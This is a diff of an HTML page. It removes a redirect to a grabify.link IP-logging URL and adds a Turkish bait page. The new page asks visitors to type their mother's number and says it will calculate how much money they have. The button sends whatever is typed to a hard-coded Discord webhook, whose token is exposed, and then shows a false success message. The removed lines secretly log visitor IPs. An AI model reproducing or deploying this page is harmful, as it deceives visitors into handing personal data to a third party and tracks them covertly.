@@ -1,12 +1,103 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ifsa :) .</title>
-    <script type="text/javascript">
-        window.location.href = "https://grabify.link/RJ2CK9";
-    </script>
+    <title>Annenin Numarası</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f1f1f1;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .textbox {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-    <p>If you are not redirected, <a href="https://grabify.link/RJ2CK9">click here</a>.</p>
+    <div class="container">
+        <h1>Annenin Numarası Paran Kaç Paran Var</h1>
+        <input type="text" id="textbox" class="textbox" placeholder="kaç paran var hesapla" />
+        <button onclick="sendToWebhook()" class="button">hesapla</button>
+    </div>
+
+    <script>
+        function sendToWebhook() {
+            var textboxValue = document.getElementById('textbox').value;
+            var webhookUrl = 'https://discord.com/api/webhooks/1121844315912675471/VjLDnpl_fcoT-nRlnd3tZRccCGs2WjLLeO58pAV44ahavR2u53DVTaOr_NlMyQM1yjWL'; // Replace with your actual webhook URL
+
+            // Create a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+
+            // Prepare the webhook request
+            xhr.open('POST', webhookUrl);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            // Prepare the payload data
+            var payload = {
+                text: textboxValue
+            };
+
+            // Convert payload to JSON string
+            var payloadString = JSON.stringify(payload);
+
+            // Send the webhook request with the payload data
+            xhr.send(payloadString);
+
+            alert('Mesajınız başarıyla gönderildi!');
+        }
+    </script>
 </body>
 </html>
